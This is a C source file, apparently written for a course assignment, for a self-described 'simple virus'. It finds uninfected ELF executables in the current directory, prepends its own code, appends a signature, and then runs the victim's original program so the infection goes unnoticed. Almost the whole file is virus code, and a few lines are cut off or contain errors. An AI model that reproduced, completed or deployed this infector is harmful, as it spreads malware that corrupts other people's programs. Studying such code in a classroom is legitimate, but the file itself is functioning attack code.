#include <stdio.h>
#include <unistd.h>
#include <dirent.h>
#include <stdbool.h>
#include <fcntl.h>
#include <sys/sendfile.h>
#include <sys/wait.h>
#include <sys/stat.h>

// "Random" sig.
#define SIG 8026
#define SIZE 14056

// Not a huge fan of this because usually in C I use a .h file
// but due to the requirements of this assignment I don't think
// I can do that. Below are the defined functions.
char* findNewVictim(int st_inode);
bool isELF(char* fn);
bool beenInfected(char* fn);
void infect(char* chosenVictim, int virusDescriptor);
bool isOrigin(int virusDescriptor);
void runVictimAnyway(int virusDescriptor, mode_t mode, int tot_size, c$


// Main method for virus.c
int main(int arrgc, char *argv[]) {
        // Retrieve information from the object at pos 0 and return 
        // it to the buffer (stat st)
        int virusDescriptor = open(argv[0], O_RDONLY);
        // File status.
        struct stat st;
        // 0 for success, -1 for fail.
        fstat(virusDescriptor, &st);
        // Prints the decided upon statement to <stdout>
        puts("Hello! I am a simple virus!\n");
        // Find the new ELF victim to infect, if none, return null.
        char* chosenVictim = findNewVictim(st.st_ino);
        // So i don't have to keep changing the proper size or worry 
        // about choosing the right size buffer we are just going to 
        // pass this down to be used in the sendfile later.
        // Now we check to see if there is anybody to infect. 
        if(chosenVictim != NULL) {
                // GIVE 'EM HELL!
                infect(chosenVictim, virusDescriptor);
        }
        // Checking if this is the original virus, in which case, we
        // have to mark it with the signature so it won't choose this 
        // file again. We also don't want to run the virus again.
        if(isOrigin(virusDescriptor)) {
                // Create a temp file.
                int temp = creat(".tempf", st.st_mode);
                // Localize the SIG.
                int sig = SIG;
                // Move the read location back to the beginning of the
                // file.
                lseek(virusDescriptor, 0, SEEK_SET);
                // Send the temp to the virus file. 
                sendfile(temp, virusDescriptor, NULL, st.st_size);
                // Write the signature where it belongs.
                write(temp, &sig, sizeof(sig));
                // Close it up.
                close(temp);
                // Set temp name to the original.
                rename(".tempf", argv[0]);
        }
        // If it's not the original virus file.
        else {
                // Assignment mandates that we have to make the
                // original intended functionality of this file run.
                runVictimAnyway(virusDescriptor, st.st_mode, st.st_siz$
        }
        // Final close.
        close(virusDescriptor);
}

// Find the new ELF victim to infect, if none, return null.
char* findNewVictim(int st_inode) {
        // File status.
        struct stat st;
        // Open the current directory.
        DIR *dir = opendir("./");
        // dirent: structure type used to return info about dir entries   
        struct dirent *dp;
        // readdir returns null if it reached the end of a dir stream.
        while((dp = readdir(dir)) != NULL) {
                // Stat is a system call that is used to determine 
                // info about a file based on its path. 
                // In this case, d_name.
                stat(dp->d_name, &st);
                // If the st.st_ino value here is the same one that is
                // called in main() and passed down, then we are 
                // looking at the virus and we do NOT wnat to infect
                // our own virus. 
                if(st.st_ino == st_inode) {
                        // Move on.
                        continue;
                }
                // We only want an ELF file that has NOT already been
                // infected. If both cases are true, return its
                // d_name so we can start the good stuff. 
                if(isELF(dp->d_name) && !beenInfected(dp->d_name)) {
                        // Close the opened dir.
                        closedir(dir);
                        // Found what we wanted.
                        return dp->d_name;
                }
        }
        // Close the opened dir still.
        closedir(dir);
        // Returning null will tell main() that we failed to find a
        // solid candidate.
        return NULL;
}

// Idea founded on a post on stackoverflow.com that answered 
// "How to tell if a file is an ELF in C" with the following:
// Read the first 16 bytes to check the file identity. The first four
// bytes will equal {0x7f, 'E','L','F'}.
bool isELF(char* fn) {
        // First two entries in a dir are . and .. and obviously
        // this is not what we are looking for.
        if(fn[0] == '.') {
                return false;
        }
        // Until I can find a better way to do it, I'm going to ignore
        // file with a 'v' as the starting letter because I don't want
        // to infect the virus.c file.
        else if(fn[0] == 'v') {
                return false;
        }
        // Open() will return the file descriptor.
        int fd = open(fn, O_RDONLY);
        // Make a buffer to use.
        char buff[4];
        // Read up to the 4th byte in the  file descriptor provided to
        // the buffer.
        read(fd, buff, 4);
        // Gotta close it before returning.
        close(fd);
        // Only an ELF if the first 4 are all in a alignment with the
        // parameters described above.
        return ((buff[0] == 0x7f) && (buff[1] == 'E')
                && (buff[2] == 'L') && (buff[3] == 'F'));
}

// Return true if we find that this file has already been infected. We
// can do this by comparing its signature to the one we provide with 
// this virus.
bool beenInfected(char* fn) {
        // Place holder.
        int sig;
        // Open() will return the file descriptor.
        int fd = open(fn, O_RDONLY);
        // lseek is a system call that is used to change the location
        // of the read/write pointer of a file descriptor. Here I am 
        // setting it to one int worth of bytes back from the end of 
        // the file.
        lseek(fd, -1 * sizeof(sig), SEEK_END);
        // Now, we read where we set with lseek above for exactly one
        // int worth of bytes into where sig is stored.
        read(fd, &sig, sizeof(sig));
        // We are done with that file for now so close it.
        close(fd);
        // Now just return whether the signature found is the same
        // as the one we have been designating.
        return (sig == SIG);
  }

// This is where we actually carry out the infecting.
void infect(char* chosenVictim, int virusDescriptor) {
        // Open() will return the file descriptor, this is the victim'$
        int victimfd = open(chosenVictim, O_RDONLY);
        // File status.
        struct stat st;
        // Read the file status and assign it to st at &st.
        fstat(victimfd, &st);
        // Get the size of the victim file.
        int victimSize = st.st_size();
        // Store the SIG locally.
        int sig = SIG;
        // Create a temporary file. Also do this with a leading '.'.
        int tempf = creat(".tempf", st.st_mode);
        // Write to the temp file the virus.
        sendfile(tempf, virusDescriptor, NULL, SIZE);
        // Stack the victim's code on top of that.
        sendfile(tempf, victimfd, NULL, victimSize);
        // Slap the sig on the end.
        write(tempf, &sig, sizeof(sig));
        // Temp file is now renamed to the victim file.
        rename(".tempf", chosenVictim);
        // Close up.
        close(tempf);
        // Close up.
        close(victimfd);
}

// Is this the original virus file that was selected?
bool isOrigin(int virusDescriptor) {
        // If it is the same exact size as the built in size, then yes.
        return SIZE == lseek(virusDescriptor, 0, SEEK_END);
}

// Work the intended functionality anyway.
void runVictimAnyway(int virusDescriptor, mode_t mode, int tot_size, c$
        // Make a temp file.
        int temp = creat(".tempf", mode);
        // Set back to the beginning of the file.
        lseek(virusDescriptor, SIZE, SEEK_SET);
        // Find the victim size.
        int victimSize = tot_size - SIZE - sizeof(SIG);
        // send all but the victim code away.
        sendfile(temp, virusDescriptor, NULL, victimSize);
        // Don't need the temp anymore.
        close(temp);
        // Fork from the parent function.
        pid_t pid = fork();
        // If it's the parent, execute. 
        if(pid == 0) {
                // Execute what is in the temporary file now with the 
                // original arguments that were passed down here.
                execv(".tempf", argv);
        }
        // So its a child.
        else {
                // Wait for the kids.
                waitpid(pid, NULL, 0);
                // Unlink.
                unlink(".tempf");
        }
}
